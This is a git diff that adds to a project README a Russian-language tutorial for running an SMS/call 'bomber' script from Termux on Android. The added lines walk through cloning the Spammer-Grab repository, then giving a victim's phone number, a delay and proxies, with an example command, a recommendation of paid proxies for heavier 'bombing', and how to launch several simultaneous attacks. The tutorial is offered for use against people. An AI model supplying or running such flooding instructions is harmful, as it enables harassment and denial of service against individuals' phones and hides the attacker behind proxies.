@@ -33,3 +33,48 @@ Options:
 This project is licensed with MIT License.
 ## Contribution
 Feel free to contribute to this project. Any kind of contribution is really appreciated.
+
+
+1. Телефон (Android)
+2. Программа Termux (эмулятор линукс)
+3. Интернет на телефоне ( Лучше WiFi )
+И так приступим, первым делом берём в свою правую или левую мощную руку телефон, заходим в Google Play и забиваем в поиск "Termux ", качаем и устанавливаем.
+Далее заходим в программу " Termux "
+И пишем туда как пишу я, все слова с новой строчки. Да, всё вводим руками, не ленимся.
+(если требует соглашение то вводим в строку "Y" без кавычек и жмем ввод)
+
+Вводим каждую строку отдельно:
+Clear
+pkg update
+pkg install git
+pkg install python
+pkg install python2
+pip2 install requests
+git clone https://github.com/p4kl0nc4t/Spammer-Grab
+ls
+chmod +x Spammer-Grab
+ls
+cd Spammer-Grab
+ls
+chmod 777 spammer.py
+
+Всё готово, осталось только запустить наш бомбер этой командой:
+python2 spammer.py --delay (пишем время задержки в сек, без скобок) --proxy (сюда пишем ссылку на прокси) и номер без +
+
+Например:
+python2 spammer.py --delay 5 --proxy http://177.35.25.32/ 7945314261234
+Можно обойтись и без прокси, но тогда толку будет не особо много. Так что советую их использовать.
+Есть бесплатные прокси, например https://awmproxy.com/freeproxy.php
+Получаете ссылку оттуда и вставляете в Termux
+Можете использовать платные прокси, тогда бомбежка будет просто адской.
+И так у нас всё готово.
+Чтобы остановить бомбёжку можно просто выйти из приложения.
+Если захотите запустить несколько атак:
+Делаете свайп в право и нажимаете New session.
+Вводим:
+cd Spammer-Grab
+python2 spammer.py и сюда снова все параметры
+Если закрыли Termux и хотим снова запустить бомбер делаем тоже самое:
+cd Spammer-Grab
+python2 spammer.py и сюда снова все параметры
+В конце добавлю, на эмуляторах аднройда работать не будет, только на мобилах или Kali Linux.
